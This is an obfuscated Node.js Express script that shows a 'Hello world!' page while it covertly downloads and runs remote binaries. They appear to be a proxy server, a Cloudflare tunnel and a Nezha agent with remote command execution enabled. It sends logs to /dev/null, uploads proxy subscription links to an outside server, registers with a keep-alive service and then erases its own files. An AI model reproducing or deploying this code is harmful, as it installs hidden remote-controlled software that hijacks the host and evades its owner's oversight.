const _0x789f87=_0x588b;(function(_0x1a5471,_0x304385){const _0xcd9caa=_0x588b,_0x463cc8=_0x1a5471();while(!![]){try{const _0xf1c7de=-parseInt(_0xcd9caa(0x1b0))/0x1*(parseInt(_0xcd9caa(0x181))/0x2)+-parseInt(_0xcd9caa(0x12c))/0x3+-parseInt(_0xcd9caa(0x1a0))/0x4*(parseInt(_0xcd9caa(0x1a3))/0x5)+-parseInt(_0xcd9caa(0x163))/0x6+parseInt(_0xcd9caa(0x142))/0x7*(parseInt(_0xcd9caa(0x1c0))/0x8)+parseInt(_0xcd9caa(0x168))/0x9+parseInt(_0xcd9caa(0x19a))/0xa;if(_0xf1c7de===_0x304385)break;else _0x463cc8['push'](_0x463cc8['shift']());}catch(_0x303737){_0x463cc8['push'](_0x463cc8['shift']());}}}(_0x17c3,0xe96a7));const express=require(_0x789f87(0x1b4)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x789f87(0x19e)),exec=promisify(require(_0x789f87(0x161))[_0x789f87(0x18a)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x789f87(0x171)][_0x789f87(0x183)]||'',PROJECT_URL=process['env'][_0x789f87(0x1b8)]||'',AUTO_ACCESS=process[_0x789f87(0x171)][_0x789f87(0x155)]||![],FILE_PATH=process[_0x789f87(0x171)][_0x789f87(0x1ba)]||_0x789f87(0x137),SUB_PATH=process[_0x789f87(0x171)][_0x789f87(0x11d)]||_0x789f87(0x174),PORT=process[_0x789f87(0x171)][_0x789f87(0x1c5)]||process[_0x789f87(0x171)][_0x789f87(0x157)]||0xbb8,UUID=process[_0x789f87(0x171)][_0x789f87(0x133)]||_0x789f87(0x1c4),NEZHA_SERVER=process[_0x789f87(0x171)][_0x789f87(0x18f)]||'',NEZHA_PORT=process[_0x789f87(0x171)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x789f87(0x171)][_0x789f87(0x13a)]||'',ARGO_DOMAIN=process[_0x789f87(0x171)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x789f87(0x171)][_0x789f87(0x129)]||'',ARGO_PORT=process['env'][_0x789f87(0x1cc)]||0x1f41,CFIP=process['env'][_0x789f87(0x12f)]||_0x789f87(0x1cb),CFPORT=process[_0x789f87(0x171)][_0x789f87(0x169)]||0x1bb,NAME=process[_0x789f87(0x171)][_0x789f87(0x16f)]||_0x789f87(0x156);!fs[_0x789f87(0x195)](FILE_PATH)?(fs[_0x789f87(0x179)](FILE_PATH),console[_0x789f87(0x141)](FILE_PATH+'\x20is\x20created')):console[_0x789f87(0x141)](FILE_PATH+_0x789f87(0x16d));function _0x17c3(){const _0x3b65d6=['./bot','util','tls','1381096PPzSYR','https://arm64.ssss.nyc.mn/agent','Empowerment\x20success\x20for\x20','5GBzoOr','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','vless','bot\x20is\x20running.','push','unlink','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://amd64.ssss.nyc.mn/v1','message','pop','bot\x20is\x20running','config.yaml','999781eBdiVB','freedom','Error\x20executing\x20command:\x20','test','express','forEach','unshift','--tls','PROJECT_URL','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','FILE_PATH','length','fileUrl','from','xtls-rprx-vision','boot.log','24RFTSPQ','2087','php','./npm','986cdcc0-d523-46b6-93a2-baebc3970bec','SERVER_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','nohup\x20','\x20failed:\x20','none','application/json','www.visa.com.sg','ARGO_PORT','?encryption=none&security=tls&sni=','vmess','ARGO_DOMAIN:','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','blackhole','2096','Download\x20','SUB_PATH','/vless-argo','http\x20server\x20is\x20running\x20on\x20port:','data','fileName','get','\x0a\x20\x20\x0atrojan://','clear','/vmess-argo','Hello\x20world!','writeFileSync','127.0.0.1','ARGO_AUTH','filter','arm','4841985lqEEsj','includes','arm64','CFIP','arch','bot','false','UUID','&path=%2Fvless-argo%3Fed%3D2560#','/trojan-argo','npm\x20running\x20error:\x20','./tmp','send','?security=tls&sni=','NEZHA_KEY','\x0a\x20\x20credentials-file:\x20','sub.txt','automatic\x20access\x20task\x20added\x20successfully','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Error\x20reading\x20boot.log:','log','3159730llwnec','pipe','\x20>/dev/null\x202>&1\x20&','all','catch','Subscription\x20uploaded\x20successfully','toString','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','finish','&type=ws&host=','/php\x20-c\x20\x22','split','tunnel.yml','web\x20is\x20running','TunnelSecret','/dev/null','post','block','amd','AUTO_ACCESS','Vls','PORT','trim','Error\x20downloading\x20files:','\x0aclient_secret:\x20','web','error','readFileSync','443','then','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','child_process','config.json','7897656dqvUSV','tcp','\x20>/dev/null\x202>&1','listen','2083','6900255iSGITd','CFPORT','/api/delete-nodes','stringify','match','\x20already\x20exists','list.txt','NAME','/bot\x20','env','2053','https://oooo.serv00.net/add-url','sub','join','true','/web\x20-c\x20','Content-Type','mkdirSync','direct','utf-8','App\x20is\x20running','\x20-p\x20','/api/add-subscriptions','/npm\x20-s\x20','has','2azFPJB','status','UPLOAD_URL','https+local://8.8.8.8/dns-query','http','base64','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','text/plain;\x20charset=utf-8','exec','./web','stream','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/2go','NEZHA_SERVER','/sub.txt\x20saved\x20successfully','tunnel.json','response','https://arm64.ssss.nyc.mn/2go','npm','existsSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/vmess-argo?ed=2560','quic','8443','31105320vIbgTZ','npm\x20is\x20running','NEZHA\x20variable\x20is\x20empty,skip\x20running'];_0x17c3=function(){return _0x3b65d6;};return _0x17c3();}let npmPath=path[_0x789f87(0x175)](FILE_PATH,_0x789f87(0x194)),phpPath=path[_0x789f87(0x175)](FILE_PATH,'php'),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x789f87(0x175)](FILE_PATH,_0x789f87(0x131)),subPath=path[_0x789f87(0x175)](FILE_PATH,_0x789f87(0x13c)),listPath=path[_0x789f87(0x175)](FILE_PATH,_0x789f87(0x16e)),bootLogPath=path[_0x789f87(0x175)](FILE_PATH,_0x789f87(0x1bf)),configPath=path['join'](FILE_PATH,_0x789f87(0x162));function deleteNodes(){const _0x1d8369=_0x789f87;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x24dd5e;try{_0x24dd5e=fs[_0x1d8369(0x15d)](subPath,_0x1d8369(0x17b));}catch{return null;}const _0x25473a=Buffer[_0x1d8369(0x1bd)](_0x24dd5e,_0x1d8369(0x186))['toString'](_0x1d8369(0x17b)),_0x7800d1=_0x25473a[_0x1d8369(0x14d)]('\x0a')[_0x1d8369(0x12a)](_0x5dc9de=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d8369(0x1b3)](_0x5dc9de));if(_0x7800d1[_0x1d8369(0x1bb)]===0x0)return;return axios[_0x1d8369(0x152)](UPLOAD_URL+_0x1d8369(0x16a),JSON[_0x1d8369(0x16b)]({'nodes':_0x7800d1}),{'headers':{'Content-Type':'application/json'}})[_0x1d8369(0x146)](_0x294a47=>{return null;});}catch(_0x29c9b6){return null;}}function _0x588b(_0x42e2a2,_0x57a930){_0x42e2a2=_0x42e2a2-0x11a;const _0x17c37e=_0x17c3();let _0x588bf2=_0x17c37e[_0x42e2a2];return _0x588bf2;}function cleanupOldFiles(){const _0x55b8b9=_0x789f87,_0x5cd4c5=[_0x55b8b9(0x15b),_0x55b8b9(0x131),'npm',_0x55b8b9(0x1c2),_0x55b8b9(0x13c),_0x55b8b9(0x1bf)];_0x5cd4c5['forEach'](_0x231e2b=>{const _0x15f485=_0x55b8b9,_0x1e5ae1=path[_0x15f485(0x175)](FILE_PATH,_0x231e2b);fs[_0x15f485(0x1a8)](_0x1e5ae1,()=>{});});}app[_0x789f87(0x122)]('/',function(_0x242e33,_0xf44603){const _0x307ae1=_0x789f87;_0xf44603[_0x307ae1(0x138)](_0x307ae1(0x126));});const config={'log':{'access':'/dev/null','error':_0x789f87(0x151),'loglevel':_0x789f87(0x1c9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x789f87(0x1a5),'settings':{'clients':[{'id':UUID,'flow':_0x789f87(0x1be)}],'decryption':_0x789f87(0x1c9),'fallbacks':[{'dest':0xbb9},{'path':_0x789f87(0x11e),'dest':0xbba},{'path':_0x789f87(0x125),'dest':0xbbb},{'path':_0x789f87(0x135),'dest':0xbbc}]},'streamSettings':{'network':_0x789f87(0x164)}},{'port':0xbb9,'listen':_0x789f87(0x128),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x789f87(0x1c9)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x789f87(0x1a5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x789f87(0x1c9),'wsSettings':{'path':_0x789f87(0x11e)}},'sniffing':{'enabled':!![],'destOverride':[_0x789f87(0x185),_0x789f87(0x19f),_0x789f87(0x198)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x789f87(0x128),'protocol':_0x789f87(0x1ce),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x789f87(0x125)}},'sniffing':{'enabled':!![],'destOverride':[_0x789f87(0x185),_0x789f87(0x19f),_0x789f87(0x198)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x789f87(0x128),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x789f87(0x1c9),'wsSettings':{'path':_0x789f87(0x135)}},'sniffing':{'enabled':!![],'destOverride':[_0x789f87(0x185),_0x789f87(0x19f),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x789f87(0x184)]},'outbounds':[{'protocol':_0x789f87(0x1b1),'tag':_0x789f87(0x17a)},{'protocol':_0x789f87(0x11a),'tag':_0x789f87(0x153)}]};fs[_0x789f87(0x127)](path[_0x789f87(0x175)](FILE_PATH,'config.json'),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x4381cf=_0x789f87,_0x454939=os[_0x4381cf(0x130)]();return _0x454939===_0x4381cf(0x12b)||_0x454939===_0x4381cf(0x12e)||_0x454939==='aarch64'?_0x4381cf(0x12b):_0x4381cf(0x154);}function downloadFile(_0x26215e,_0x546242,_0x3f0759){const _0x423878=_0x789f87,_0x537385=path['join'](FILE_PATH,_0x26215e),_0xd01f89=fs['createWriteStream'](_0x537385);axios({'method':_0x423878(0x122),'url':_0x546242,'responseType':_0x423878(0x18c)})[_0x423878(0x15f)](_0xecdc72=>{const _0x37642a=_0x423878;_0xecdc72[_0x37642a(0x120)][_0x37642a(0x143)](_0xd01f89),_0xd01f89['on'](_0x37642a(0x14a),()=>{const _0x5507dd=_0x37642a;_0xd01f89['close'](),console[_0x5507dd(0x141)]('Download\x20'+_0x26215e+'\x20successfully'),_0x3f0759(null,_0x26215e);}),_0xd01f89['on'](_0x37642a(0x15c),_0x541533=>{const _0x443611=_0x37642a;fs[_0x443611(0x1a8)](_0x537385,()=>{});const _0x22deee='Download\x20'+_0x26215e+_0x443611(0x1c8)+_0x541533[_0x443611(0x1ac)];console[_0x443611(0x15c)](_0x22deee),_0x3f0759(_0x22deee);});})[_0x423878(0x146)](_0x7d04bc=>{const _0x17b5ed=_0x423878,_0x737975=_0x17b5ed(0x11c)+_0x26215e+_0x17b5ed(0x1c8)+_0x7d04bc[_0x17b5ed(0x1ac)];console[_0x17b5ed(0x15c)](_0x737975),_0x3f0759(_0x737975);});}async function downloadFilesAndRun(){const _0x5c5691=_0x789f87,_0x477d7d=getSystemArchitecture(),_0x1760c2=getFilesForArchitecture(_0x477d7d);if(_0x1760c2[_0x5c5691(0x1bb)]===0x0){console[_0x5c5691(0x141)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x36f3fd=_0x1760c2['map'](_0x5a1a1d=>{return new Promise((_0x52d41c,_0x591f7e)=>{const _0x335371=_0x588b;downloadFile(_0x5a1a1d[_0x335371(0x121)],_0x5a1a1d[_0x335371(0x1bc)],(_0x394b88,_0x4ebcae)=>{_0x394b88?_0x591f7e(_0x394b88):_0x52d41c(_0x4ebcae);});});});try{await Promise[_0x5c5691(0x145)](_0x36f3fd);}catch(_0x2a2397){console[_0x5c5691(0x15c)](_0x5c5691(0x159),_0x2a2397);return;}function _0x38eca8(_0x51e50c){const _0x2275d9=0x1fd;_0x51e50c['forEach'](_0x4acd7b=>{const _0x15e2b6=_0x588b,_0x4fe435=path[_0x15e2b6(0x175)](FILE_PATH,_0x4acd7b);fs[_0x15e2b6(0x195)](_0x4fe435)&&fs['chmod'](_0x4fe435,_0x2275d9,_0x3ef917=>{const _0x36f98a=_0x15e2b6;_0x3ef917?console['error']('Empowerment\x20failed\x20for\x20'+_0x4fe435+':\x20'+_0x3ef917):console['log'](_0x36f98a(0x1a2)+_0x4fe435+':\x20'+_0x2275d9[_0x36f98a(0x148)](0x8));});});}const _0x2c111d=NEZHA_PORT?[_0x5c5691(0x1c3),'./web',_0x5c5691(0x19d)]:['./php',_0x5c5691(0x18b),_0x5c5691(0x19d)];_0x38eca8(_0x2c111d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x46f83d=NEZHA_SERVER[_0x5c5691(0x12d)](':')?NEZHA_SERVER[_0x5c5691(0x14d)](':')[_0x5c5691(0x1ad)]():'',_0x32d960=new Set([_0x5c5691(0x15e),'8443',_0x5c5691(0x11b),'2087',_0x5c5691(0x167),'2053']),_0x49b69c=_0x32d960[_0x5c5691(0x180)](_0x46f83d)?_0x5c5691(0x176):_0x5c5691(0x132),_0x99ec61=_0x5c5691(0x15a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x5c5691(0x160)+_0x49b69c+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x5c5691(0x175)](FILE_PATH,_0x5c5691(0x1af)),_0x99ec61);const _0x34bacd=_0x5c5691(0x1c7)+FILE_PATH+_0x5c5691(0x14c)+FILE_PATH+_0x5c5691(0x196);try{await exec(_0x34bacd),console[_0x5c5691(0x141)]('php\x20is\x20running'),await new Promise(_0x1794e4=>setTimeout(_0x1794e4,0x3e8));}catch(_0x1becdb){console[_0x5c5691(0x15c)](_0x5c5691(0x1d0)+_0x1becdb);}}else{let _0x2e799b='';const _0xe7ad02=[_0x5c5691(0x15e),_0x5c5691(0x199),_0x5c5691(0x11b),_0x5c5691(0x1c1),'2083',_0x5c5691(0x172)];_0xe7ad02[_0x5c5691(0x12d)](NEZHA_PORT)&&(_0x2e799b=_0x5c5691(0x1b7));const _0x500866=_0x5c5691(0x1c7)+FILE_PATH+_0x5c5691(0x17f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c5691(0x17d)+NEZHA_KEY+'\x20'+_0x2e799b+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x500866),console['log'](_0x5c5691(0x19b)),await new Promise(_0x616f4b=>setTimeout(_0x616f4b,0x3e8));}catch(_0x315134){console[_0x5c5691(0x15c)](_0x5c5691(0x136)+_0x315134);}}}else console['log'](_0x5c5691(0x19c));const _0x47969c=_0x5c5691(0x1c7)+FILE_PATH+_0x5c5691(0x177)+FILE_PATH+_0x5c5691(0x18d);try{await exec(_0x47969c),console[_0x5c5691(0x141)](_0x5c5691(0x14f)),await new Promise(_0x230466=>setTimeout(_0x230466,0x3e8));}catch(_0xb2022a){console[_0x5c5691(0x15c)]('web\x20running\x20error:\x20'+_0xb2022a);}if(fs[_0x5c5691(0x195)](path[_0x5c5691(0x175)](FILE_PATH,'bot'))){let _0x28f0e3;if(ARGO_AUTH[_0x5c5691(0x16c)](/^[A-Z0-9a-z=]{120,250}$/))_0x28f0e3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5c5691(0x16c)](/TunnelSecret/)?_0x28f0e3=_0x5c5691(0x13f)+FILE_PATH+_0x5c5691(0x13e):_0x28f0e3=_0x5c5691(0x188)+FILE_PATH+_0x5c5691(0x1b9)+ARGO_PORT;try{await exec(_0x5c5691(0x1c7)+FILE_PATH+_0x5c5691(0x170)+_0x28f0e3+_0x5c5691(0x144)),console['log'](_0x5c5691(0x1ae)),await new Promise(_0xc91864=>setTimeout(_0xc91864,0x7d0));}catch(_0x504bd8){console['error'](_0x5c5691(0x1b2)+_0x504bd8);}}await new Promise(_0xbfca44=>setTimeout(_0xbfca44,0x1388));}function getFilesForArchitecture(_0x18c9b4){const _0x2c8035=_0x789f87;let _0x1e6b5d;_0x18c9b4==='arm'?_0x1e6b5d=[{'fileName':'web','fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x2c8035(0x131),'fileUrl':_0x2c8035(0x193)}]:_0x1e6b5d=[{'fileName':_0x2c8035(0x15b),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x2c8035(0x18e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x462cf7=_0x18c9b4==='arm'?_0x2c8035(0x1a1):'https://amd64.ssss.nyc.mn/agent';_0x1e6b5d[_0x2c8035(0x1b6)]({'fileName':_0x2c8035(0x194),'fileUrl':_0x462cf7});}else{const _0x256479=_0x18c9b4===_0x2c8035(0x12b)?'https://arm64.ssss.nyc.mn/v1':_0x2c8035(0x1ab);_0x1e6b5d[_0x2c8035(0x1b6)]({'fileName':'php','fileUrl':_0x256479});}}return _0x1e6b5d;}function argoType(){const _0x32cce5=_0x789f87;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x32cce5(0x141)](_0x32cce5(0x149));return;}if(ARGO_AUTH[_0x32cce5(0x12d)](_0x32cce5(0x150))){fs[_0x32cce5(0x127)](path[_0x32cce5(0x175)](FILE_PATH,_0x32cce5(0x191)),ARGO_AUTH);const _0x489331='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x32cce5(0x14d)]('\x22')[0xb]+_0x32cce5(0x13b)+path[_0x32cce5(0x175)](FILE_PATH,_0x32cce5(0x191))+_0x32cce5(0x1c6)+ARGO_DOMAIN+_0x32cce5(0x1d1)+ARGO_PORT+_0x32cce5(0x1a4);fs['writeFileSync'](path['join'](FILE_PATH,_0x32cce5(0x14e)),_0x489331);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x33d168=_0x789f87;let _0x442923;if(ARGO_AUTH&&ARGO_DOMAIN)_0x442923=ARGO_DOMAIN,console['log'](_0x33d168(0x1cf),_0x442923),await _0x2e4c73(_0x442923);else try{const _0x53efad=fs[_0x33d168(0x15d)](path[_0x33d168(0x175)](FILE_PATH,_0x33d168(0x1bf)),_0x33d168(0x17b)),_0x172371=_0x53efad['split']('\x0a'),_0x3dee6b=[];_0x172371[_0x33d168(0x1b5)](_0x4920f5=>{const _0x26e821=_0x33d168,_0x4f63ac=_0x4920f5[_0x26e821(0x16c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4f63ac){const _0x23091a=_0x4f63ac[0x1];_0x3dee6b['push'](_0x23091a);}});if(_0x3dee6b[_0x33d168(0x1bb)]>0x0)_0x442923=_0x3dee6b[0x0],console[_0x33d168(0x141)]('ArgoDomain:',_0x442923),await _0x2e4c73(_0x442923);else{console[_0x33d168(0x141)](_0x33d168(0x1aa)),fs['unlinkSync'](path[_0x33d168(0x175)](FILE_PATH,_0x33d168(0x1bf)));async function _0x5f452b(){const _0x56b595=_0x33d168;try{await exec(_0x56b595(0x187));}catch(_0x91e041){}}_0x5f452b(),await new Promise(_0x2d3013=>setTimeout(_0x2d3013,0xbb8));const _0x1a0843='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x33d168(0x1b9)+ARGO_PORT;try{await exec(_0x33d168(0x1c7)+path[_0x33d168(0x175)](FILE_PATH,_0x33d168(0x131))+'\x20'+_0x1a0843+_0x33d168(0x144)),console[_0x33d168(0x141)](_0x33d168(0x1a6)),await new Promise(_0x15162d=>setTimeout(_0x15162d,0xbb8)),await extractDomains();}catch(_0x1b2224){console[_0x33d168(0x15c)](_0x33d168(0x1b2)+_0x1b2224);}}}catch(_0x123eb0){console[_0x33d168(0x15c)](_0x33d168(0x140),_0x123eb0);}async function _0x2e4c73(_0x325631){const _0x3d9732=_0x33d168,_0x41707a=execSync(_0x3d9732(0x1a9),{'encoding':_0x3d9732(0x17b)}),_0x325f54=_0x41707a[_0x3d9732(0x158)]();return new Promise(_0x709f80=>{setTimeout(()=>{const _0x13e152=_0x588b,_0x2cb53a={'v':'2','ps':NAME+'-'+_0x325f54,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x13e152(0x1c9),'net':'ws','type':'none','host':_0x325631,'path':_0x13e152(0x197),'tls':_0x13e152(0x19f),'sni':_0x325631,'alpn':''},_0x1e02eb='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x13e152(0x1cd)+_0x325631+_0x13e152(0x14b)+_0x325631+_0x13e152(0x134)+NAME+'-'+_0x325f54+'\x0a\x20\x20\x0avmess://'+Buffer[_0x13e152(0x1bd)](JSON[_0x13e152(0x16b)](_0x2cb53a))['toString'](_0x13e152(0x186))+_0x13e152(0x123)+UUID+'@'+CFIP+':'+CFPORT+_0x13e152(0x139)+_0x325631+_0x13e152(0x14b)+_0x325631+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x325f54+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x13e152(0x1bd)](_0x1e02eb)[_0x13e152(0x148)]('base64')),fs[_0x13e152(0x127)](subPath,Buffer[_0x13e152(0x1bd)](_0x1e02eb)[_0x13e152(0x148)](_0x13e152(0x186))),console[_0x13e152(0x141)](FILE_PATH+_0x13e152(0x190)),uplodNodes(),app[_0x13e152(0x122)]('/'+SUB_PATH,(_0x2f0c17,_0x33738)=>{const _0x15867a=_0x13e152,_0x26845e=Buffer[_0x15867a(0x1bd)](_0x1e02eb)[_0x15867a(0x148)](_0x15867a(0x186));_0x33738['set'](_0x15867a(0x178),_0x15867a(0x189)),_0x33738[_0x15867a(0x138)](_0x26845e);}),_0x709f80(_0x1e02eb);},0x7d0);});}}async function uplodNodes(){const _0x419e51=_0x789f87;if(UPLOAD_URL&&PROJECT_URL){const _0x39ced7=PROJECT_URL+'/'+SUB_PATH,_0x1c8fbd={'subscription':[_0x39ced7]};try{const _0x4c1d79=await axios[_0x419e51(0x152)](UPLOAD_URL+_0x419e51(0x17e),_0x1c8fbd,{'headers':{'Content-Type':_0x419e51(0x1ca)}});if(_0x4c1d79[_0x419e51(0x182)]===0xc8)console[_0x419e51(0x141)](_0x419e51(0x147));else return null;}catch(_0xb19c98){if(_0xb19c98[_0x419e51(0x192)]){if(_0xb19c98[_0x419e51(0x192)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5e866b=fs['readFileSync'](listPath,_0x419e51(0x17b)),_0xac2a9a=_0x5e866b['split']('\x0a')['filter'](_0x121b9e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x419e51(0x1b3)](_0x121b9e));if(_0xac2a9a[_0x419e51(0x1bb)]===0x0)return;const _0x27f9c9=JSON[_0x419e51(0x16b)]({'nodes':_0xac2a9a});try{await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x27f9c9,{'headers':{'Content-Type':_0x419e51(0x1ca)}});if(response[_0x419e51(0x182)]===0xc8)console[_0x419e51(0x141)](_0x419e51(0x147));else return null;}catch(_0x3455f2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x10d488=_0x588b,_0x163059=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x163059[_0x10d488(0x1a7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x163059[_0x10d488(0x1a7)](phpPath);exec('rm\x20-rf\x20'+_0x163059['join']('\x20')+_0x10d488(0x165),_0x4a566b=>{const _0x4e75c8=_0x10d488;console[_0x4e75c8(0x124)](),console[_0x4e75c8(0x141)](_0x4e75c8(0x17c)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x51a6c3=_0x789f87;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x4b074c=await axios['post'](_0x51a6c3(0x173),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x51a6c3(0x1ca)}});console[_0x51a6c3(0x141)](_0x51a6c3(0x13d));}catch(_0x266210){console[_0x51a6c3(0x15c)]('添加URL失败:\x20'+_0x266210[_0x51a6c3(0x1ac)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x789f87(0x166)](PORT,()=>console[_0x789f87(0x141)](_0x789f87(0x11f)+PORT+'!'));
